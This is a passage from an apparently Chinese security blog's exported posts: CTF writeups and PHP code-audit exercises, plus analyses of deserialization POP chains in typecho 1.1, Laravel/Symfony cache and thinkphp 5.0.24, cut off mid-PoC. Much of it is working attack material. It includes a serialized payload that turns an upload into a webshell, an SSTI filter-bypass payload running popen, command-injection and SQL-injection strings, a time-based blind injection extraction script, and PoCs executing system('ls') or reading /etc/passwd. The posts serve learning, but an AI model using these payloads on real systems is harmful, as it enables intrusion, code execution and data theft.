在index()中调用login_check()，而在login_check()中把cookie中传来的值直接进行反序列化，我们再看Profile类中在upload_img()函数开始时会自动调用login_check()，然后再往下看这里会将文件进行重命名，我们就可以通过重命名将已经上传的png文件重命名为php文件，从而获取webshell，前面那个检查文件名后缀只有在通过表单上传文件时才会触发。这样思路就清楚了，1234==&gt;Register-&gt;__destruct()==&gt;Profile-&gt;__call()==&gt;Profile-&gt;__get()==&gt;Profile-&gt;upload_img() 先随便上传一个写有weshell的jpg后缀的文件，然后通过访问/upload/获取文件名，接下来就开始构造：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpnamespace app\\web\\controller; class Profile{ public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __get($name) { return $this-&gt;except[$name]; } public function __call($name, $arguments) { if($this-&gt;{$name}){ $this-&gt;{$this-&gt;{$name}}($arguments); } } } class Register{ public $checker; public $registed; public function __destruct() { if(!$this-&gt;registed){ $this-&gt;checker-&gt;index(); } } } $profile = new Profile();$profile-&gt;except = ['index' =&gt; 'img'];$profile-&gt;img = &quot;upload_img&quot;;$profile-&gt;ext = &quot;png&quot;;$profile-&gt;filename_tmp = &quot;../public/upload/04b0951938d905b41348c1548f9c338b/197eb9d5e3830b156293e9c9d951518b.png&quot;;$profile-&gt;filename = &quot;../public/upload/04b0951938d905b41348c1548f9c338b/197eb9d5e3830b156293e9c9d951518b.php&quot;; $register = new Register();$register-&gt;registed = false;$register-&gt;checker = $profile; echo urlencode(base64_encode(serialize($register))); 因为那几个文件都加了namespace，所以我们在构造的时候也要加上，运行这个得到payload：1TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjg2OiIuLi9wdWJsaWMvdXBsb2FkLzA0YjA5NTE5MzhkOTA1YjQxMzQ4YzE1NDhmOWMzMzhiLzE5N2ViOWQ1ZTM4MzBiMTU2MjkzZTljOWQ5NTE1MThiLnBuZyI7czo4OiJmaWxlbmFtZSI7czo4NjoiLi4vcHVibGljL3VwbG9hZC8wNGIwOTUxOTM4ZDkwNWI0MTM0OGMxNTQ4ZjljMzM4Yi8xOTdlYjlkNWUzODMwYjE1NjI5M2U5YzlkOTUxNTE4Yi5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtzOjM6InBuZyI7czozOiJpbWciO3M6MTA6InVwbG9hZF9pbWciO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MzoiaW1nIjt9fXM6ODoicmVnaXN0ZWQiO2I6MDt9 传入cookie中，然后访问我们的weshell，得到flag。 [pasecactf_2019]flask_ssti首先试一下49发现存在ssti注入，然后发现 '._ 这三个符号被ban了。一般方法好像都用不了了，今天学到一种新的绕过方法，使用十六进制绕过，在模板注入时可以使用，但正常的python语法是不支持的。 “.”的十六进制就是\\x2e “_”的十六进制就是\\x5f 单引号用双引号代替就像这样：等价于先用下面这个payload读取到app.py的源码1{{&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbase\\x5f\\x5f&quot;][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[127][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;popen&quot;](&quot;cat app\\x2epy&quot;)[&quot;read&quot;]()}} 源码，只放关键部分了：123456789def encode(line, key, key2): return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))file = open(&quot;/app/flag&quot;, &quot;r&quot;)flag = file.read()flag = flag[:42]app.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')flag = &quot;&quot; 解密这个得到flag。","link":"/2020/08/10/buuoj-03/"},{"title":"upload_labs","text":"[TOC]upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。项目地址：https://github.com/c0ny1/upload-labs","link":"/2020/08/13/upload-labs/"},{"title":"代码审计之——PHP-Audit-Labs","text":"在github上面找的一个代码审计的项目，地址是： https://github.com/hongriSec/PHP-Audit-Labs/正好通过这个项目练习一下代码审计，每个都包含了不同的知识点，学习学习。 Day1 - in_array函数缺陷题目如下 12345678910111213141516171819202122232425262728293031323334353637//index.php&lt;?phpinclude 'config.php';$conn = new mysqli($servername, $username, $password, $dbname);if ($conn-&gt;connect_error) { die(&quot;连接失败: &quot;);}$sql = &quot;SELECT COUNT(*) FROM users&quot;;$whitelist = array();$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0){ $row = $result-&gt;fetch_assoc(); $whitelist = range(1, $row['COUNT(*)']);}$id = stop_hack($_GET['id']);$sql = &quot;SELECT * FROM users WHERE id=$id&quot;;if (!in_array($id, $whitelist)) { die(&quot;id $id is not in whitelist.&quot;);}$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0){ $row = $result-&gt;fetch_assoc(); echo &quot;&lt;center&gt;&lt;table border='1'&gt;&quot;; foreach ($row as $key =&gt; $value) { echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;; echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;; } echo &quot;&lt;/table&gt;&lt;/center&gt;&quot;;}else{ die($conn-&gt;error);}?&gt; config.php 1234567891011121314151617//config.php&lt;?php $servername = &quot;localhost&quot;;$username = &quot;root&quot;;$password = &quot;root&quot;;$dbname = &quot;day1&quot;;function stop_hack($value){ $pattern = &quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;; $back_list = explode(&quot;|&quot;,$pattern); foreach($back_list as $hack){ if(preg_match(&quot;/$hack/i&quot;, $value)) die(&quot;$hack detected!&quot;); } return $value;}?&gt; 这道题考察的是in_array()绕过和不能使用拼接函数的updatexml报错注入。in_array()：在index.php中把id值传入whitelist数组中，然后用户传入的id先经过过滤函数过滤，然后再用in_array判断用户传入的id是否在whitelist中。这里in_array()是没有使用强匹配，所以可以绕过，当传入的id值为1’便可绕过in_array函数。updatexml：这个stop_hack函数把该过滤的都过滤了，其中过滤了concat连接函数，而我们如果使用updatexml报错注入前面都要拼接0x7e这样的特殊字符，否则查询的数据会丢失一部分，而concat被过滤了。我们还可以使用 make_set 或者 export_set() 函数来拼接字符，可以参考mysql make_set()的用法。 1234mysql&gt; select updatexml(1,export_set(1|1,'~',(select user())),1);ERROR 1105 (HY000): XPATH syntax error: '~,root@localhost,root@localhost,'mysql&gt; select updatexml(1,make_set(3,'~',(select user())),1);ERROR 1105 (HY000): XPATH syntax error: '~,root@localhost' 然后看一下本题payload： 1id=4 and (select updatexml(1,make_set(3,'~',(select flag from flag)),1)) Day2 - filter_var函数缺陷题目如下： 123456789101112131415161718192021&lt;?php $url = $_GET['url'];if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL)){ $site_info = parse_url($url); if(preg_match('/sec-redclub.com$/',$site_info['host'])){ exec('curl &quot;'.$site_info['host'].'&quot;', $result); echo &quot;&lt;center&gt;&lt;h1&gt;You have curl {$site_info['host']} successfully!&lt;/h1&gt;&lt;/center&gt; &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;&quot;; echo implode(' ', $result); } else{ die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;); }}else{ echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt; &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;;}?&gt; 这个考察的时filter_var函数的绕过与远程命令执行，中间exec函数拼接了$site_info['host']，而$site_info['host']是parse_url($url)得来的，url是我们传入可控的，问题就是药绕过filter_var的FILTER_VALIDATE_URL过滤器，这里提供了几个绕过方法，如下： 12345678http://localhost/index.php?url=http://demo.com@sec-redclub.comhttp://localhost/index.php?url=http://demo.com&amp;sec-redclub.comhttp://localhost/index.php?url=http://demo.com?sec-redclub.comhttp://localhost/index.php?url=http://demo.com/sec-redclub.comhttp://localhost/index.php?url=demo://demo.com,sec-redclub.comhttp://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/http://localhost/index.php?url=http://demo.com#sec-redclub.comPS:最后一个payload的#符号，请换成对应的url编码 %23 接着要绕过 parse_url 函数，并且满足 $site_info[‘host’] 的值以 sec-redclub.com 结尾，payload如下： 1?url=demo://%22;ls;%23;sec-redclub.com:80/ 不知道为什么在windows下加上#就绕过不了了，在linux下可以，然后cat flag的时候，因为filter_var函数不可以使用空格，换成cat&lt;flag就好了。 Day3 - 实例化任意对象漏洞先看代码： 123456789101112131415161718192021&lt;?phpclass NotFound{ function __construct() { die('404'); }}spl_autoload_register( function ($class){ new NotFound(); });$classname = isset($_GET['name']) ? $_GET['name'] : null;$param = isset($_GET['param']) ? $_GET['param'] : null;$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;if(class_exists($classname)){ $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.'=&gt;'.$value.'&lt;br&gt;';} 实例化漏洞结合XXE，不会，先跳过了。 Day5 - 全局变量覆盖123456789101112131415161718192021222324252627282930313233343536373839&lt;?phphighlight_file('index.php');function waf($a){ foreach($a as $key =&gt; $value){ if(preg_match('/flag/i',$key)){ exit('are you a hacker'); } }}foreach(array('_POST', '_GET', '_COOKIE') as $__R) { if($$__R) { foreach($$__R as $__k =&gt; $__v) { if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); } }}if($_POST) { waf($_POST);}if($_GET) { waf($_GET); }if($_COOKIE) { waf($_COOKIE);}if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);if(isset($_GET['flag'])){ if($_GET['flag'] === $_GET['hongri']){ exit('error'); } if(md5($_GET['flag'] ) == md5($_GET['hongri'])){ $url = $_GET['url']; $urlInfo = parse_url($url); if(!(&quot;http&quot; === strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;===strtolower($urlInfo[&quot;scheme&quot;]))){ die( &quot;scheme error!&quot;); } $url = escapeshellarg($url); $url = escapeshellcmd($url); system(&quot;curl &quot;.$url); }}?&gt; 循环获取字符串 GET、POST、COOKIE ，并依次赋值给变量 $__R 。然后判断 $$__R 变量是否存在数据，如果存在，则继续判断超全局数组 GET、POST、COOKIE 中是否存在键值相等的，如果存在，则删除该变量。这里有个 可变变量 的概念需要先理解一下。 可变变量指的是：一个变量的变量名可以动态的设置和使用。一个可变变量获取了一个普通变量的值作为其变量名。 我通过 GET 请求向 index.php 提交 flag=test ，接着通过 POST 请求提交 _GET[flag]=test 。当开始遍历 $_POST 超全局数组的时候， $__k 代表 _GET[flag] ，所以 $$__k 就是 $_GET[flag] ，即 test 值，此时 $$__k == $__v 成立，变量 $_GET[flag] 就被 unset 了。但是在 第21行 和 22行 有这样一串代码： 12if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP); extract 函数的作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值， EXTR_SKIP 参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 POST 请求提交 _GET[flag] = test ，所以这里会变成 $_GET[flag]=test ，这里的 $_GET 变量就不需要再经过 waf 函数检测了，也就绕过了 preg_match(‘/flag/i’,$key) 的限制。 再往下就是提交两个md5值都是0e开头的值就好了 第二部分主要考察 curl 读取文件。这里主要加了两个坑， escapeshellarg() 和 escapeshellcmd() 一起使用的时候会造成的问题，主要看看这部分代码。 12$url = escapeshellarg($url);$url = escapeshellcmd($url); escapeshellarg ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号 escapeshellcmd ，会对以下的字符进行转义&amp;#;|*?~&lt;&gt;^()[]{}$, x0A 和 xFF, ' 和 &quot;仅在不配对儿的时候被转义。 两个函数配合使用就会导致多个参数的注入，我们详细分析一下： 传入的参数是：172.17.0.2’ -v -d a=1 经过escapeshellarg处理后变成了’172.17.0.2’'‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成’172.17.0.2’\\‘’ -v -d a=1'，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义. 最后执行的命令是curl ‘172.17.0.2’\\‘’ -v -d a=1'，由于中间的\\被解释为\\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1’，即向172.17.0.2\\发起请求，POST 数据为a=1’。 其实这里直接读取127.0.0.1/flag.php就好了。 Day6123456789101112131415161718192021222324252627282930&lt;?phpinclude 'flag.php';if (&quot;POST&quot; == $_SERVER['REQUEST_METHOD']){ $password = $_POST['password']; if (0 &gt;= preg_match('/^[[:graph:]]{12,}$/', $password)) { echo 'Wrong Format'; exit; } while (TRUE) { $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array('punct', 'digit', 'upper', 'lower'); foreach ($ps as $pt) { if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; } if ($c &lt; 3) break; if (&quot;42&quot; == $password) echo $flag; else echo 'Wrong password'; exit; }}highlight_file(__FILE__);?&gt; 这道题主要考察正则表达式，和弱类型比较的问题，| alnum | 字母和数字 || ——– | —————- || alpha | 字母 || ascii | 0 - 127的ascii字符 || blank | 空格和水平制表符 || cntrl | 控制字符 || digit | 十进制数(same as \\d) || graph | 打印字符, 不包括空格 || lower | 小写字母 || print | 打印字符,包含空格 || punct | 打印字符, 不包括字母和数字 || space | 空白字符 (比\\s多垂直制表符) || upper | 大写字母 || word | 单词字符(same as \\w) || xdigit | 十六进制数字 | 代码中共有三处正则表达式匹配，挨个看一下。第一处的正则 /^[[:graph:]]{12,}$/ 为：匹配到可打印字符12个以上(包含12)，^ 号表示必须以某类字符开头，$ 号表示必须以某类字符结尾。第二处正则表达式： 123$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';if (6 &gt; preg_match_all($reg, $password, $arr)) break; 表示字符串中，把连续的符号、数字、大写、小写，作为一段，至少分六段。第三处: 1234567$ps = array('punct', 'digit', 'upper', 'lower');foreach ($ps as $pt){ if (preg_match(\"/[[:$pt:]]+/\", $password)) $c += 1;}if ($c &lt; 3) break; 表示为输入的字符串至少含有符号、数字、大写、小写中的三种类型。然后题目最后将 $password 与42进行了弱比较。最后pyayload为： 142.000e-0000 Day7123456789&lt;?php$a = &quot;hongri&quot;;echo $a;$id = $_GET['id'];@parse_str($id);if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')) { echo '&lt;a href=&quot;uploadsomething.php&quot;&gt;flag is here&lt;/a&gt;';}?&gt; 12345678910111213141516171819&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);$referer = $_SERVER['HTTP_REFERER'];if(isset($referer)!== false) { $savepath = &quot;uploads/&quot; . sha1($_SERVER['REMOTE_ADDR']) . &quot;/&quot;; if (!is_dir($savepath)) { $oldmask = umask(0); mkdir($savepath, 0777); umask($oldmask); } if ((@$_GET['filename']) &amp;&amp; (@$_GET['content'])) { //$fp = fopen(&quot;$savepath&quot;.$_GET['filename'], 'w'); $content = 'HRCTF{y0u_n4ed_f4st} by:l1nk3r'; file_put_contents(&quot;$savepath&quot; . $_GET['filename'], $content); $msg = 'Flag is here,come on~ ' . $savepath . htmlspecialchars($_GET['filename']) . &quot;&quot;; usleep(100000); $content = &quot;Too slow!&quot;; file_put_contents(&quot;$savepath&quot; . $_GET['filename'], $content); } 先提交一个id=a[0]=s878926199a，然后条件竞争一下就好了。 Day8123456789101112131415161718&lt;?php//include 'flag.php';if(isset($_GET['code'])){ $code=$_GET['code']; if(strlen($code)&gt;40){ die(&quot;Long.&quot;); } if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){ die(&quot;NO.&quot;); } @eval($code);}else{ highlight_file(__FILE__);}highlight_file(__FILE__);// $hint = &quot;php function getFlag() to get flag&quot;;?&gt; 无字母数字webshell，直接 12echo urlencode(~'phpinfo');//输出：%8F%97%8F%96%91%99%90 然后提交?code=(~%8F%97%8F%96%91%99%90)()，便可以了。 Day101234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude 'config.php';function stophack($string){ if(is_array($string)){ foreach($string as $key =&gt; $val) { $string[$key] = stophack($val); } } else{ $raw = $string; $replace = array(&quot;\\\\&quot;,&quot;\\&quot;&quot;,&quot;'&quot;,&quot;/&quot;,&quot;*&quot;,&quot;%5C&quot;,&quot;%22&quot;,&quot;%27&quot;,&quot;%2A&quot;,&quot;~&quot;,&quot;insert&quot;,&quot;update&quot;,&quot;delete&quot;,&quot;into&quot;,&quot;load_file&quot;,&quot;outfile&quot;,&quot;sleep&quot;,); $string = str_ireplace($replace, &quot;HongRi&quot;, $string); $string = strip_tags($string); if($raw!=$string){ error_log(&quot;Hacking attempt.&quot;); header('Location: /error/'); } return trim($string); }}$conn = new mysqli($servername, $username, $password, $dbname);if ($conn-&gt;connect_error) { die(&quot;连接失败: &quot;);}if(isset($_GET['id']) &amp;&amp; $_GET['id']){ $id = stophack($_GET['id']); $sql = &quot;SELECT * FROM students WHERE id=$id&quot;; $result = $conn-&gt;query($sql); if($result-&gt;num_rows &gt; 0){ $row = $result-&gt;fetch_assoc(); echo '&lt;center&gt;&lt;h1&gt;查询结果为：&lt;/h1&gt;&lt;pre&gt;'.&lt;&lt;&lt;EOF +----+---------+--------------------+-------+ | id | name | email | score | +----+---------+--------------------+-------+ | {$row['id']} | {$row['name']} | {$row['email']} | {$row['score']} | +----+---------+--------------------+-------+&lt;/center&gt;EOF; }}else die(&quot;你所查询的对象id值不能为空！&quot;);?&gt; 时间的盲注，使用benchmark。脚本。 1234567891011121314151617181920212223import sys, string, requestsversion_chars = &quot;.-{}_&quot; + string.ascii_letters + string.digits + '#'flag = &quot;&quot;for i in range(1,40): for char in version_chars: payload = &quot;-1 or if(ascii(mid((select flag from flag),%s,1))=%s,benchmark(200000000,7^3^8),0)&quot; % (i,ord(char)) url = &quot;http://localhost/index.php?id=%s&quot; % payload if char == '#': if(flag): sys.stdout.write(&quot;\\n[+] The flag is： %s&quot; % flag) sys.stdout.flush() else: print(&quot;[-] Something run error!&quot;) exit() try: r = requests.post(url=url, timeout=2.0) except Exception as e: flag += char sys.stdout.write(&quot;\\r[-] Try to get flag： %s&quot; % flag) sys.stdout.flush() breakprint(&quot;[-] Something run error!&quot;)","link":"/2020/08/18/PHP-Audit-Labs/"},{"title":"一篇writeup","text":"嗨，请准确无误地输入密码查看哟！ ","link":"/2020/08/27/Writeup/"},{"title":"typecho反序列化利用链分析","text":"[toc]上次国赛有一道这个题，baby_serialize，看了好久也没做出来，感觉自己代码审计能力太差了，于是乎想找几个cms审审反序列化的链子，于是就有了这篇。找的是typecho1.1的那个漏洞，呜呜呜太菜了，因为是第一次，还是一边看师傅博客一边完成的，此处膜拜P3师傅。因为现在的版本漏洞已经修复了，搭环境还浪费了好长时间，真的心累。 利用条件漏洞利用的地方是在install.php，这里只是验证了一下有没有get提交finish参数，若没有则退出，有的话再继续往下进行，先看看利用点： 12345678&lt;?php else : ?&gt; &lt;?php $config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config'))); Typecho_Cookie::delete('__typecho_config'); $db = new Typecho_Db($config['adapter'], $config['prefix']); $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE); Typecho_Db::set($db);?&gt; 这里把从get中数据然后base64解码然后再反序列化，看一下get方法的实现： 这里用了一个三目运算符，如果cookie存在就从cookie中获取值，否则就从POST参数获取值。这里我们只要直接通过cookie或者post传入我们的payload就可以利用此次漏洞。 反序列化利用链构造因为这里是 unserialize 函数，首先我们肯定要找 __destruct() 魔术方法来利用反序列化，结果看了一圈也没有一个能用的，然后又全局搜索了 __wakeup() 方法，也是没有可以利用的。然后往下看，new了一个 Typecho_Db 类，看看这个类的 __construct 。 db.php 114-120行： 可以看到这里用了字符串拼接操作，在这里可以触发 __toString() 方法，然后全局搜索__toString，在feed.php中发现可利用点。 feed.php 258-259行： 这里的 item['author']-&gt;screenName 可以触发 __get() 方法，然后全局搜索get方法，然后会在request.php中发现可以rce的get()方法。首先是 request.php 269-272行： 这里调用get函数，跟进 request.php 295-311行： 这里在最后会调用_applyFilter方法，看看这个方法 request.php 159-171行： 就会调用这里的call_user_func()执行函数。还要说的一个地方就是，当按照上面的所有流程构造poc之后，发请求到服务器，却会返回500。原因是在install.php的开始，调用了 ob_start() ，当我们在执行的时候会触发原本的exception，导致ob_end_clean()执行，原本的缓冲区被清理。必须像一个办法下强制退出，使得代码不会执行到exception，这样原本的缓冲区数据就会被输出出来。 这里有两个办法。 1、因为call_user_func函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。 2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。 解决了这个问题，整个利用POP链就成立了poc： 12345678910111213141516171819202122232425262728&lt;?php class Typecho_Feed{ private $_type = 'RSS 2.0'; private $_charset = 'UTF-8'; private $_lang = 'zh'; private $_items = array(); function __construct(){ $this-&gt;_items[] = [&quot;author&quot;=&gt;new Typecho_Request(),'category'=&gt;array(new Typecho_Request())]; }}class Typecho_Request{ private $_params = array(); private $_filter = array(); function __construct(){ $this-&gt;_filter = array(&quot;assert&quot;); $this-&gt;_params = ['screenName'=&gt;'phpinfo()']; }}$config = array('host' =&gt; 'localhost',&quot;adapter&quot;=&gt;new Typecho_Feed(),&quot;prefix&quot;=&gt;'123',&quot;pop&quot;=&gt;'123');echo serialize($config);echo &quot;&lt;br&gt;&quot;;echo base64_encode(serialize($config)); 成功执行： 修复方法若是之前的版本只要删掉install.php就好了，看看官方的修复方法： 增加了对数据库的判断，原来finish被删掉了，这样就安全多了。","link":"/2020/09/03/typecho-1-1/"},{"title":"ciscn2019 laravel反序列化利用链","text":"[toc]这几天总想着审点反序列化的链子，结果刚好在buu上看到一道不错的题，刚好练练手。打开页面就是简短的代码告诉我们是反序列化，然后根据提示下载下来源码。用的是laravel框架，讲实话这种框架的代码好难看懂，不懂这个index.php是怎么执行的，然后边查资料边看终于懂了一点点。 路由信息首先要查看路由信息，所有的Laravel路由都是在routes目录下的路由文件中，这些文件通过框架自动加载。routes/web.php文件定义了web界面的路由，这些路由被分配了web中间件组，从而可以提供session和csrf防护等功能。routes/api.php中的路由是无状态的，被分配了 api 中间件组。对大多数应用而言，都是从 routes/web.php 文件开始定义路由。 我们可以看到在web.php中自动加载了IndexController类中的index方法。明白了他为什么这样运行之后就可以开始看代码了。 反序列化利用 很明了的反序列化。看这种反序列化一般都是直接全局搜索魔法函数，看看有没有可用的 __destruct(),__wakeup(),__toString(),__call() 等等。就先看__destruct()吧，一搜一堆，心态崩了，看了半天终于看到一个能用的，在TagAwareAdapter.php的TagAwareAdapter类里面。 __destruct调用了 commit 方法，然后 commit() 又调用了 invalidateTags() 方法，跟进这个方法。在第125行，$this-&gt;pool-&gt;saveDeferred($item)这种可以触发__call方法，但我把__call都看了一遍发现没有可以利用的。然后想到了可以调用别的类的saveDeferred()方法。然后全局搜索了一下这个方法找到两个可用的。第一个是在 ProxyAdapter.php 中,第二个是在 PhpArrayAdapter.php 中，分别看一下这两个方法，也对应两个exp。 ProxyAdapter.php saveDeferred() 先调用了 dosave() 方法，然后在 dosave() 的223行，也就是红框中的部分有任意函数执行，函数名是可控的，就是 $this-&gt;setInnerItem ，函数参数也是可控的。 当满足if条件的时候，会把 $item[“\\0*\\0innerItem”] 的值赋给 $innerItem。再往前看 instanceof是检查一个变量是否是一个类的实例化。这个if语句就是，如果$item不是CacheItem类的实例化，就退出。只要赋值$item为CacheItem类的实例化即可。 system()有第二个参数，这个第二个参数的意思实际上是将执行结果保存到return_var变量,所以这只能是个变量名，这里把return_var的值直接放进函数里是不行的，我试了一下return_var参数是int型和数组型都可以，所以跟变量类型无关。然后便可以写exp，要注意命名空间。 1234567891011121314151617181920212223242526272829303132&lt;?phpnamespace Symfony\\Component\\Cache\\Adapter { class ProxyAdapter{ private $setInnerItem; function __construct(){ $this-&gt;setInnerItem = 'system'; } }}namespace Symfony\\Component\\Cache { class CacheItem{ protected $innerItem; function __construct() { $this-&gt;innerItem = 'ls'; } }}namespace Symfony\\Component\\Cache\\Adapter { use Symfony\\Component\\Cache\\CacheItem; class TagAwareAdapter{ private $deferred = []; private $pool; function __construct(){ $this-&gt;deferred = array('123'=&gt; new CacheItem()); $this-&gt;pool = new ProxyAdapter(); } } $a = new TagAwareAdapter(); echo urlencode(serialize($a));} PhpArrayAdapter.php再来看第二个 调用了initialize()方法，跟进一下，在PhpArrayTrait类中，这里的trait是什么意思呢？ Trait 是为类似 PHP 的单继承语言而准备的一种代码复用机制。Trait 为了减少单继承语言的限制，使开发人员能够自由地在不同层次结构内独立的类中复用 method。 Trait 和 Class 组合的语义定义了一种减少复杂性的方式，避免传统多继承和 Mixin 类相关典型问题。 简单来说就是一种多继承的方式，PhpArrayTrait也就是PhpArrayAdapter的父类。当在子类中找不到方法时会自动进入父类中寻找，这也就是为什么跟进到的initialize()在PhpArrayTrait类中。下面看一下这个方法。 中间的include参数中存在变量，存在任意文件包含。构造一下exp。 1234567891011121314151617181920212223242526272829303132&lt;?phpnamespace Symfony\\Component\\Cache { class CacheItem{ protected $innerItem; function __construct() { $this-&gt;innerItem = 'ls'; } }}namespace Symfony\\Component\\Cache\\Adapter { use Symfony\\Component\\Cache\\CacheItem; class PhpArrayAdapter{ private $values; private $file; function __construct(){ $this-&gt;values = null; $this-&gt;file = '/etc/passwd'; } } class TagAwareAdapter{ private $deferred = []; private $pool; function __construct(){ $this-&gt;deferred = array('123'=&gt; new CacheItem()); $this-&gt;pool = new PhpArrayAdapter(); } } $a = new TagAwareAdapter(); echo urlencode(serialize($a));} 结语到这里差不多就结束了，还是太菜了，得多审点链子，多多看代码。太菜了太菜了。","link":"/2020/09/10/ciscn-laravel1/"},{"title":"thinkphp5.0.24反序列化pop链分析","text":"[toc] 关于本文这篇是对thinkphp5.0.24反序列化漏洞的复现，因为代码量有点大，分析起来属实让人自闭，看的我头疼。本文分析会附带poc，但是在windows下无法执行，在文章最后会贴出解决方法。 环境搭建从网上下载下来此版本的代码，然后打开 application\\index\\controller\\index.php，写下如下代码。 phpstorm+xdebug配置，下载一个chrome插件：xdebug helper，跟着网上教程设置一下，然后phpstorm监听，就可以断点单步跟踪调试了。然后还开了框架的debug模式。 反序列化分析全局搜索一下__destruct()方法，在Windows类中发现一个可以利用的。 跟进removeFiles()方法 这里的file_exists()函数会触发__toString()方法，全局搜索__tostring()，在Model类中发现可以利用的，因为Model是抽象类，不能被实例化为对象，必须找到他的子类Pivot，父类中的方法子类是可以继承的嘛，一会用Pivot就好了。 __toStrint() =&gt; toJson() =&gt; toArray() 跟进toArray()方法，这个方法前半部分是没有用的，不用管他，直接看后半部分 看这一行代码 1$item[$key] = $value ? $value-&gt;getAttr($attr) : null; 这里的 value 和 attr 都是可控的，这不是正好可以触发__call方法吗，于是向前看看这两个变量是怎么来的。首先 this-&gt;append不为空且为数组，数组里面的值不能为数组，并且不能包含点号。这个 loader::parseName() 就是转换大小写的函数，不用管。然后往下第902行，如果 $this-&gt;$relation() 存在并且把其返回值赋值给 $modeRelation 。因为这里是 $this-&gt;$relation() 而不是 $this-&gt;relation() ，我们便可以通过 $relation参数调用这个类中的任意方法往下找了找找到了这个方法，可以返回任意值。 然后下面这行代码，调用了 $modeRelation 作为参数，并且把返回值传给 $value ， 1$value = $this-&gt;getRelationData($modelRelation); 跟进一下 这里又一个if/else分支，按道理来说if为真时完全可以达成一条完整的pop链，把 $this-&gt;parent 的值赋值给value，然后再往下触发__call 即可，但不知道为什么复现时候老是报错，没办法执行，真难，艹。 然后又找到了另一条链子，这里就不看没成功的那个了，回头有时间再看看。看646行， 1$value = $modelRelation-&gt;getRelation(); 调用了 getRelation 方法，我们要找一个有这个方法并且返回值可控的，于是在 HasOne 这个类中找到了这个方法，看一下 看第53、54行，这里两个参数都是可控的，在这里可以触发 __call() 。 可调用的 __call() 在 Output 类中： 跟进 Output 类 block 方法 跟进 writeIn 方法 跟进 write 方法 这里可以调用任意类的write方法，全局搜索一下write方法，在 Memcache 类中的 write 可以调用任意类的 set方法。 寻找 set 方法，在 File 类中， 需要使用伪协议绕过exit()使用file_put_contents()写入shell，这里第一次调用 set 参数是不可控的，无法写shell，真正写shell是利用 setTagItem() 方法第二次调用set，然后就可以写入shell了。 POC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?php//File类namespace think\\cache\\driver;class File{ protected $tag='sodayo'; protected $options = [ 'expire' =&gt; 0, 